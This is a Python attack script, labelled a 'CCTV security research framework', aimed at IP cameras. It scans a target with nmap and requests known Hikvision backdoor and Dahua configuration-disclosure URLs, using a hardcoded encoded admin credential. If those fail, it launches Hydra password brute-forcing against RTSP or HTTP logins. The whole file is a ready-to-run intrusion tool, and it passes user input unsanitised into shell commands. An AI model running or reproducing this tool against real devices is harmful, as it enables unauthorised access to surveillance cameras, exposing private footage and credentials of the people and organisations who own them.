import os
import subprocess
import requests
import sys
import time

# ANSI Color Codes
G, R, Y, B, RS = '\033[92m', '\033[91m', '\033[93m', '\033[94m', '\033[0m'

BANNER = f"""
{B}==========================================================
#           CCTV SECURITY RESEARCH FRAMEWORK           #
#      Service Recon | Vulnerability | Brute Force     #
=========================================================={RS}
"""

def analyze_nmap(output):
    print(f"\n{Y}[*] AI Analysis of Nmap Output:{RS}")
    if "401 Unauthorized" in output or "Digest" in output:
        print(f"{B}[i] Status: Target is protected by Digest Authentication.{RS}")
        print(f"{B}[i] Recommendation: Direct bypass unlikely. Use Brute Force.{RS}")
    elif "200 OK" in output:
        print(f"{G}[!] Status: Potential Open Entry detected! Check Phase 2 links.{RS}")
    elif "App-level" in output or "webcam" in output.lower():
        print(f"{B}[i] Status: IP Camera / Webcam service confirmed.{RS}")
    else:
        print(f"{Y}[i] Status: Service detected but hardening status unknown.{RS}")

def run_live(cmd):
    full_output = ""
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    while True:
        output = process.stdout.readline()
        if output == '' and process.poll() is not None:
            break
        if output:
            line = output.strip()
            print(f"{B}[LIVE]{RS} " + line)
            full_output += line + "\n"
    return full_output

def check_payloads(ip, port):
    print(f"\n{Y}[*] Phase 2: Testing Known Exploit Payloads...{RS}")
    payloads = [
        {"name": "Hikvision Backdoor", "url": f"http://{ip}:{port}/System/configurationFile?auth=YWRtaW46MTEK"},
        {"name": "Hikvision User List", "url": f"http://{ip}:{port}/Security/users?auth=YWRtaW46MTEK"},
        {"name": "Dahua Configuration", "url": f"http://{ip}:{port}/cgi-bin/configManager.cgi?action=getConfig&name=System"}
    ]
    
    found = False
    for p in payloads:
        try:
            print(f"{Y}[?] Testing {p['name']}...{RS}")
            time.sleep(1) 
            r = requests.get(p['url'], timeout=10, verify=False, allow_redirects=False)
            
            if r.status_code == 200:
                print(f"{G}[+] VULNERABILITY CONFIRMED: {p['name']}{RS}")
                print(f"{G}[+] Exploit Link: {p['url']}{RS}")
                found = True
            else:
                print(f"{R}[-] {p['name']} failed (Response: {r.status_code}){RS}")
        except:
            print(f"{R}[X] {p['name']}: Connection Timed Out{RS}")
    return found

def main():
    os.system('clear')
    print(BANNER)
    
    if len(sys.argv) < 3:
        print(f"{R}Usage: python3 script.py <IP> <PORT>{RS}")
        return

    target_ip, target_port = sys.argv[1], sys.argv[2]

    # Phase 1: Service Recon
    print(f"{Y}[*] Phase 1: Identifying Service & Security Layer...{RS}")
    nmap_cmd = f"nmap -p {target_port} -sV --open {target_ip}"
    nmap_output = run_live(nmap_cmd)
    
    # AI Analysis of Nmap Output
    analyze_nmap(nmap_output)

    # Phase 2: Payloads
    is_vuln = check_payloads(target_ip, target_port)

    # Phase 3: Brute Force Selection
    if not is_vuln:
        print(f"\n{R}[-] No direct bypass found. Manual authentication required.{RS}")
        choice = input(f"{Y}Initialize Hydra Brute Force? (y/n): {RS}").lower()
        
        if choice == 'y':
            print(f"\n{B}--- HYDRA ENGINE CONFIGURATION ---{RS}")
            print("1. Single Account Attack (Known Username)")
            print("2. Discovery Attack (User List + Pass List)")
            mode = input(f"{Y}Select Mode (1/2): {RS}")
            
            wlist = input(f"{Y}Wordlist Path: {RS}")
            protocol = "rtsp" if target_port == "554" else "http-get"
            
            if mode == '1':
                user = input(f"{Y}Username: {RS}")
                hydra_cmd = f"hydra -l {user} -P {wlist} {target_ip} -s {target_port} {protocol} / -V -f -t 16"
            else:
                ulist = input(f"{Y}User List Path: {RS}")
                hydra_cmd = f"hydra -L {ulist} -P {wlist} {target_ip} -s {target_port} {protocol} / -V -f -t 16"
            
            print(f"\n{G}[*] Launching Hydra Execution...{RS}")
            run_live(hydra_cmd)
        else:
            print(f"{Y}[*] Operation Terminated by User.{RS}")

if __name__ == "__main__":
    main()
